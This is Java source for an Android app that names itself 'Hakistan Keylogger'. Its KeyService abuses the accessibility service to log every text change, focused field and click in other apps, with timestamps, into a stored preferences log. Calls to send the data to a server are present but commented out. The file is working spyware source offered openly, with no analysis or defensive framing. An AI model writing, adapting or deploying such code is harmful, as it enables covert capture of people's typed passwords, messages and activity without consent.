package com.hak15tan.hakistankeylogger;

import android.accessibilityservice.AccessibilityService;
import android.content.SharedPreferences;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Locale;



public class KeyService extends AccessibilityService {

    public static final String MY_PREFS_NAME = "GPrefs";
    public static final String MY_PREFS_STRING_KEY = "GPrefsStringsKey";

    public static final String MY_PREFS_Text_Count_KEY = "GPrefsText_CountKey";
    public static final String MY_PREFS_FOCUSED_Count_KEY = "GPrefsFOCUSED_CountKey";
    public static final String MY_PREFS_Clicks_Count_KEY = "GPrefsClicks_CountKey";

    @Override
    public void onServiceConnected() {
        Log.d("Keylogger", "Starting service");
    }

    //@RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {


        DateFormat df = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US);
        String time = df.format(Calendar.getInstance().getTime());

        SharedPreferences.Editor editor = getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE).edit();

        SharedPreferences prefs = getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE);
        String perviousData = prefs.getString(MY_PREFS_STRING_KEY, "Hakistan Keylogger \n");//"No name defined" is the default value.



        switch(event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                String data = event.getText().toString();
               // SendToServerTask sendTask = new SendToServerTask();
                String string = time + "|(TEXT)|" + data;

                perviousData = perviousData + string+"\n";

                Long perviousNotiCountData = prefs.getLong(MY_PREFS_Text_Count_KEY,0);//"No name defined" is the default value.


                Long tosaveCount = perviousNotiCountData + 1;

                editor.putLong(MY_PREFS_Text_Count_KEY, tosaveCount);
                //editor.putInt("idName", 12);

                editor.putString(MY_PREFS_STRING_KEY, perviousData);
                //editor.putInt("idName", 12);
                editor.apply();
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                String data = event.getText().toString();
                //SendToServerTask sendTask = new SendToServerTask();
                String FOCUSED =  time + "|(FOCUSED)|" + data;

                perviousData = perviousData + FOCUSED + "\n";

                Long perviousNotiCountData = prefs.getLong(MY_PREFS_FOCUSED_Count_KEY,0);//"No name defined" is the default value.


                Long tosaveCount = perviousNotiCountData + 1;

                editor.putLong(MY_PREFS_FOCUSED_Count_KEY, tosaveCount);
                //editor.putInt("idName", 12);

               // editor.putString(MY_PREFS_STRING_KEY, perviousData);

                editor.putString(MY_PREFS_STRING_KEY, perviousData);
                //editor.putInt("idName", 12);
                editor.apply();

                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                String data = event.getText().toString();
                //SendToServerTask sendTask = new SendToServerTask();
                String CLICKED = time + "|(CLICKED)|" + data;

                perviousData  = perviousData + CLICKED + "\n";

                Long perviousNotiCountData = prefs.getLong(MY_PREFS_Clicks_Count_KEY,0);//"No name defined" is the default value.


                Long tosaveCount = perviousNotiCountData + 1;

                editor.putLong(MY_PREFS_Clicks_Count_KEY, tosaveCount);
                //editor.putInt("idName", 12);

               // editor.putString(MY_PREFS_STRING_KEY, perviousData);

                editor.putString(MY_PREFS_STRING_KEY, perviousData);
                //editor.putInt("idName", 12);
                editor.apply();

                break;
            }
            default:
                break;
        }
    }

    @Override
    public void onInterrupt() {

    }
}
